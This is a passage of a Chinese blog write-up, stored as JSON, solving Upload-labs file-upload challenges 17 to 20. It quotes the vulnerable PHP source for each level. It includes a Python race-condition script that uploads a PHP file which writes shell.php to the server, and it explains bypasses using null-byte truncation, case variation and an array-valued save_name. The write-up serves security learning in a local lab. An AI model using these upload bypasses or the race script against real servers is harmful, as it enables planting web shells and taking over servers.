\"请选择要上传的文件！\";\n}\n```\n\n​\t这道题使用了`MIME`验证和白名单验证。先看第10行使用了`三目运算符`判断`$_POST['save_name']`是否为空，若为空则执行`:`前获取上传文件的名称，若不为空则获取POST中的`save_name`。第11行使用了`is_array`函数判断是否是一个数组，然后使用`explode`截断文件名转换小写并返回数组。也就是说，如果我们POST中的`save_name`是个数组的就可以跳过11行的判断。15行使用`end`函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组**第一个**元素+数组元素**总数-1**的那个元素。\n\n所以我们可以构造一个这样的数组用于绕过：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119170734.png)\n\n​\t数组[2]用于绕过白名单，文件名为：`数组[0].数组[1]`，但是数组[1]是空的所以只剩下`数组[0].`（后面有个点）\n\n​\t别忘了还要绕过**MIME**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172340.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172415.png)\n\n完工\n\n## 最后\n\n​\tUpload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。","slug":"Upload-Labs5","published":1,"updated":"2021-12-30T09:42:54.199Z","_id":"ckrr3f9ay000rhotcgnb2dtay","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Pass-17\"><a href=\"#Pass-17\" class=\"headerlink\" title=\"Pass-17\"></a>Pass-17</h2><p>​    （windows环境，php版本5.2.17，题号是18题）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$file_name</span>,strrpos(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             rename(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            unlink(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    思路和前面的一样，获取文件信息，移动文件到<strong>upload</strong>文件夹，第12行使用了白名单验证，多了第14行的<code>rename</code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了<strong>上传竞争</strong>，使用<code>python</code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;</code>这段代码执行以后，会创建一个名为<code>shell.php</code>里面有一句<code>&lt;?php phpinfo();?&gt;</code>的文件。</p>\n<p>​    脚本代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Pool</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CompeteUpload</span>(<span class=\"params\"><span class=\"built_in\">list</span></span>):</span></span><br><span class=\"line\">    url=<span class=\"string\">&quot;http://upload-labs/Pass-18/index.php&quot;</span>   <span class=\"comment\">#上传页面</span></span><br><span class=\"line\">    geturl=<span class=\"string\">&quot;http://upload-labs/upload/233.php&quot;</span>\t <span class=\"comment\">#访问上传文件</span></span><br><span class=\"line\">    file=&#123;<span class=\"string\">&#x27;upload_file&#x27;</span>:(<span class=\"string\">&#x27;233.php&#x27;</span>,<span class=\"string\">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>,<span class=\"string\">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class=\"line\">    data=&#123;<span class=\"string\">&#x27;submit&#x27;</span>:<span class=\"string\">&#x27;上传&#x27;</span>&#125;</span><br><span class=\"line\">    r=requests.post(url=url,data=data,files=file)</span><br><span class=\"line\">    <span class=\"comment\">#print &quot;test upload....&quot;</span></span><br><span class=\"line\">    r1=requests.get(url=geturl)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> r1.status_code==<span class=\"number\">200</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;upload success!&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    pool = Pool(<span class=\"number\">10</span>)</span><br><span class=\"line\">    pool.<span class=\"built_in\">map</span>(CompeteUpload, <span class=\"built_in\">range</span>(<span class=\"number\">10000</span>))</span><br><span class=\"line\">    pool.close()</span><br><span class=\"line\">    pool.join()</span><br></pre></td></tr></table></figure>\n\n<p>​    第一次用python的我在这里知道了<code>pip</code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119090033.png\"></p>\n<h2 id=\"Pass-18（失手）\"><a href=\"#Pass-18（失手）\" class=\"headerlink\" title=\"Pass-18（失手）\"></a>Pass-18（失手）</h2><p>​    18题失手了没有思路，如果使用<code>include.php</code>文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是<code>apache2.2.x的解析漏洞</code>，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。</p>\n<p><a href=\"https://blog.csdn.net/qq_32434307/article/details/79480316\">Apache文件解析漏洞</a></p>\n<p><a href=\"https://www.cnblogs.com/yuzly/p/11226377.html\">apache httpd多后缀解析漏洞复现</a></p>\n<p>​    源码中还有一个可以突破的点是同样使用了<strong>重命名函数</strong>，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以<del>先摸为敬</del>。</p>\n<h2 id=\"Pass-19\"><a href=\"#Pass-19\" class=\"headerlink\" title=\"Pass-19\"></a>Pass-19</h2><p>（windows环境，php5.2.17，magic_quotes_gpc=Off）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = pathinfo(<span class=\"variable\">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123; </span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    源码第七行使用了<strong>POST</strong>来接受文件的命名，前面有类似题的是使用了<strong>0x00截断上传</strong>，后面也同样是<code>move_uploaded_file</code>移动文件的函数，还使用了黑名单验证，方法就很明确，使用<strong>截断上传</strong>。别忘了截断上传需要的特定条件：php版本需要低于<code>5.3.29</code>、<code>magic_quotes_gpc</code>需要为关闭状态。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164220.png\"></p>\n<p>​    同样是命名为<code>phpa</code>方便在十六进制表里修改为<code>00</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119162729.png\"></p>\n<p>​    打开图片把url链接<code>http://upload-labs/upload/upload-19.php�</code>修改一下即可。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164458.png\"></p>\n<p>​    其实这道题还有一个思路，因为题目使用了<strong>黑名单验证</strong>，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如<code>Php</code>，不演示了。</p>\n<h2 id=\"Pass-20\"><a href=\"#Pass-20\" class=\"headerlink\" title=\"Pass-20\"></a>Pass-20</h2><p>（LInux环境，php7.2.21）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = explode(<span class=\"string\">&#x27;.&#x27;</span>, strtolower(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = end(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = reset(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[count(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题使用了<code>MIME</code>验证和白名单验证。先看第10行使用了<code>三目运算符</code>判断<code>$_POST[&#39;save_name&#39;]</code>是否为空，若为空则执行<code>:</code>前获取上传文件的名称，若不为空则获取POST中的<code>save_name</code>。第11行使用了<code>is_array</code>函数判断是否是一个数组，然后使用<code>explode</code>截断文件名转换小写并返回数组。也就是说，如果我们POST中的<code>save_name</code>是个数组的就可以跳过11行的判断。15行使用<code>end</code>函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组<strong>第一个</strong>元素+数组元素<strong>总数-1</strong>的那个元素。</p>\n<p>所以我们可以构造一个这样的数组用于绕过：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119170734.png\"></p>\n<p>​    数组[2]用于绕过白名单，文件名为：<code>数组[0].数组[1]</code>，但是数组[1]是空的所以只剩下<code>数组[0].</code>（后面有个点）</p>\n<p>​    别忘了还要绕过<strong>MIME</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172340.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172415.png\"></p>\n<p>完工</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>​    Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Pass-17\"><a href=\"#Pass-17\" class=\"headerlink\" title=\"Pass-17\"></a>Pass-17</h2><p>​    （windows环境，php版本5.2.17，题号是18题）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$file_name</span>,strrpos(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             rename(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            unlink(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    思路和前面的一样，获取文件信息，移动文件到<strong>upload</strong>文件夹，第12行使用了白名单验证，多了第14行的<code>rename</code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了<strong>上传竞争</strong>，使用<code>python</code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;</code>这段代码执行以后，会创建一个名为<code>shell.php</code>里面有一句<code>&lt;?php phpinfo();?&gt;</code>的文件。</p>\n<p>​    脚本代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing <span class=\"keyword\">import</span> Pool</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CompeteUpload</span>(<span class=\"params\"><span class=\"built_in\">list</span></span>):</span></span><br><span class=\"line\">    url=<span class=\"string\">&quot;http://upload-labs/Pass-18/index.php&quot;</span>   <span class=\"comment\">#上传页面</span></span><br><span class=\"line\">    geturl=<span class=\"string\">&quot;http://upload-labs/upload/233.php&quot;</span>\t <span class=\"comment\">#访问上传文件</span></span><br><span class=\"line\">    file=&#123;<span class=\"string\">&#x27;upload_file&#x27;</span>:(<span class=\"string\">&#x27;233.php&#x27;</span>,<span class=\"string\">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>,<span class=\"string\">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class=\"line\">    data=&#123;<span class=\"string\">&#x27;submit&#x27;</span>:<span class=\"string\">&#x27;上传&#x27;</span>&#125;</span><br><span class=\"line\">    r=requests.post(url=url,data=data,files=file)</span><br><span class=\"line\">    <span class=\"comment\">#print &quot;test upload....&quot;</span></span><br><span class=\"line\">    r1=requests.get(url=geturl)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> r1.status_code==<span class=\"number\">200</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;upload success!&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    pool = Pool(<span class=\"number\">10</span>)</span><br><span class=\"line\">    pool.<span class=\"built_in\">map</span>(CompeteUpload, <span class=\"built_in\">range</span>(<span class=\"number\">10000</span>))</span><br><span class=\"line\">    pool.close()</span><br><span class=\"line\">    